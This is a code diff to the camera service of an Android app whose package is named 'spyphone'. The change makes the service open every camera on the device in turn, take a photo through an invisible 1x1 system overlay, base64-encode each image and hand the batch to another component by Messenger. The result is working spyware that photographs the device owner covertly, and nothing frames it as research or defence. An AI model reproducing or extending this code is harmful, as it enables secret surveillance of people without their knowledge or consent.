@@ -11,6 +11,7 @@ import android.os.IBinder;
 import android.os.Message;
 import android.os.Messenger;
 import android.os.RemoteException;
+import android.os.SystemClock;
 import android.util.Log;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
@@ -23,6 +24,7 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
 
 import emit.esy.es.spyphone.interfaces.ServiceResponse;
@@ -34,7 +36,9 @@ public class CameraService extends Service implements ServiceResponse {
 
     private static final String LOG_TAG = "CameraService";
 
+    ArrayList<String> photos;
     String pictureData;
+    Camera camera = null;
 
     @Override
     public int onStartCommand(final Intent intent, int flags, int startId) {
@@ -48,46 +52,52 @@ public class CameraService extends Service implements ServiceResponse {
             @Override
             //The preview must happen at or after this point or takePicture fails
             public void surfaceCreated(SurfaceHolder holder) {
-                showMessage("Surface created");
+                Log.d(LOG_TAG, "Surface created");
 
-                Camera camera = null;
+
+                final int noc = Camera.getNumberOfCameras();
+                photos = new ArrayList<>();
+
+                for(int i = 0; i < noc; i++){
 
                 try {
-                    camera = Camera.open();
-                    showMessage("Opened camera");
+                    Log.d(LOG_TAG, "Now will pause for " + Integer.toString(i + 1) + " time");
+                    SystemClock.sleep(1500);
+                    camera = Camera.open(i);
+                    Log.d(LOG_TAG, "Opened camera " + Integer.toString(i));
 
-                    try {
-                        camera.setPreviewDisplay(holder);
-                    } catch (IOException e) {
-                        throw new RuntimeException(e);
-                    }
+                    camera.setPreviewDisplay(holder);
 
                     camera.startPreview();
-                    showMessage("Started preview");
+                    Log.d(LOG_TAG, "Started preview");
 
                     camera.takePicture(null, null, new Camera.PictureCallback() {
 
                         @Override
                         public void onPictureTaken(byte[] data, Camera camera) {
-                            showMessage("Took picture");
+                            Log.d(LOG_TAG, "Took picture");
                             //savePicture(data);
                             pictureData = new String(Base64.encodeBytes(data));
                             Log.d("Picture", pictureData);
+                            photos.add(pictureData);
                             camera.release();
                             onWorkDone(intent);
-
                         }
                     });
-                } catch (Exception e) {
-                    if (camera != null)
-                        camera.release();
-                    throw new RuntimeException(e);
+                    } catch (Exception e) {
+
+                    Log.e(LOG_TAG, e.toString());
+                        if (camera != null)
+                            camera.release();
+                    }
                 }
             }
+
 
             @Override public void surfaceDestroyed(SurfaceHolder holder) {}
             @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}
         });
+
 
         WindowManager wm = (WindowManager) this
                 .getSystemService(Context.WINDOW_SERVICE);
@@ -95,11 +105,10 @@ public class CameraService extends Service implements ServiceResponse {
                 1, 1, //Must be at least 1x1
                 WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                 0,
-                //Don't know if this is a safe default
                 PixelFormat.UNKNOWN);
 
-        //Don't set the preview visibility to GONE or INVISIBLE
         wm.addView(preview, params);
+
 
         return START_NOT_STICKY;
     }
@@ -107,7 +116,7 @@ public class CameraService extends Service implements ServiceResponse {
     private void savePicture(byte[] data) {
         File pictureFile = getOutputMediaFile();
         if (pictureFile == null){
-            Log.d(LOG_TAG, "Error creating media file, check storage permissions: " );
+            Log.d(LOG_TAG, "Error creating media file, check storage permissions");
             return;
         }
 
@@ -158,11 +167,11 @@ public class CameraService extends Service implements ServiceResponse {
         Bundle bundle = intent.getExtras();
         Bundle data = new Bundle();
         data.putString("action", "photo");
-        data.putString("content", pictureData);
+        data.putStringArrayList("content", photos);
         if (bundle != null) {
             Messenger messenger = (Messenger) bundle.get("messenger");
             Message msg = Message.obtain();
-            msg.setData(data);//put the data here
+            msg.setData(data);
             try {
                 messenger.send(msg);
             } catch (RemoteException e) {
@@ -174,6 +183,8 @@ public class CameraService extends Service implements ServiceResponse {
     @Override
     public void onDestroy() {
         Log.d(LOG_TAG, "onDestroy");
+        if (camera != null)
+            camera.release();
         super.onDestroy();
     }
 
@@ -182,7 +193,4 @@ public class CameraService extends Service implements ServiceResponse {
         return null;
     }
 
-    private static void showMessage(String message) {
-        Log.i("Camera", message);
-    }
 }
